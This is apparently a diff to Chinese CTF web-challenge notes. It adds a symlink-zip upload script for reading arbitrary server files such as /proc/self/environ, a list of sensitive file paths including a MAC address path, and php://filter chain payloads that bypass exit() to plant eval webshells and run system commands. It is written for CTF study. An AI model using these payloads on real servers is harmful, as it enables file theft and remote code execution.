@@ -366,6 +366,7 @@ print("index of subprocess.Popen:" + str(index))
 /var/log/secure
 /etc/sysconfig/network-scripts/ifcfg-eth0
 /etc/syscomfig/network-scripts/ifcfg-eth1
+/sys/class/net/eth0/address //eth0网卡的MAC地址
 ```
 
 44. 基础[xxe](../../CTF/BUUCTF/Web/[NCTF2019]Fake%20XML%20cookbook.md)探测内网网段脚本。
@@ -1317,3 +1318,61 @@ return Null;
 ```
 
 填入我们注册的`Dumb         xx`和密码是可以查出结果的。虽然用户信息是我们自己的，但查出的用户名是Dumb。如果后续使用用户名而不是用户信息进行逻辑处理，我们就完成了一次越权。
+
+195. [[HCTF 2018]Hideandseek](https://www.cnblogs.com/Yhck/p/13644349.html)
+- 软链接zip上传导致的任意文件读取。常出现于以下场景：网站允许上传zip并返回zip压缩的文件的内容。这时就能压缩一个想读取文件路径的软链接，返回的内容就会是想要读取的文件的内容了。
+```python
+import os
+import requests
+import sys
+
+
+def make_zip():
+    os.system('ln -s ' + sys.argv[2] + ' test_exp')
+    os.system('zip -y test_exp.zip test_exp')
+
+
+def run():
+    make_zip()
+    res = requests.post(sys.argv[1], files={'the_file': open('./test_exp.zip', 'rb')})
+    print(res.text)
+
+    os.system('rm -rf test_exp')
+    os.system('rm -rf test_exp.zip')
+run()
+```
+用法：`python3 s.py http://example/upload /proc/self/environ`。需要在linux环境下运行。
+- python的uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址。可使用脚本将16进制的mac地址转换为整数：
+
+```python
+mac = "76:22:18:a1:3d:35".split(":")
+mac_int = [int(i, 16) for i in mac]
+mac_bin = [bin(i).replace('0b', '').zfill(8) for i in mac_int]
+mac_dec = int("".join(mac_bin), 2)
+print(mac_dec)
+```
+
+196. [[WMCTF2020]Web Check in 2.0](https://npfs06.top/2021/02/01/%E5%AF%92%E5%81%87buu30%E8%A7%A3%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/)
+- php绕过exit：
+```php
+if(isset($_GET['content'])) {
+    $content = $_GET['content'];
+    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
+         die('hacker');
+    if(file_exists($content))
+        require_once($content);
+    file_put_contents($content,'<?php exit();'.$content);
+}
+```
+
+[file_put_contents](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)支持多个过滤器混用。这里把常用的用于绕过exit的过滤器过滤掉后，还有两种办法。第一种：因为file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以可以利用二次编码绕过。
+```
+?content=php://filter/write=string.%2572ot13|<?cuc @riny($_TRG[_]);?>/resource=npfs.php 
+?content=npfs.php&_=system("ls /");
+```
+
+这道题因为会不断执行file_put_contents，所以每个shell只能利用一次，执行一条命令后需要重新上传。第二种：利⽤ zlib 的 zlib.deflate 和 zlib.inflate 来做，中间插⼊string.tolower，把空格和exit处理掉。而插入'%0d'是因为php标签是独立的,需要与php代码分割开。正好%0d是换行的url编码，可以用来分割。
+```
+?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?%3E%3C?php%0Deval($_POST[pass]);?%3E/resource=shell.php
+(post ?content=shell.php)pass=system("ls /");
+```
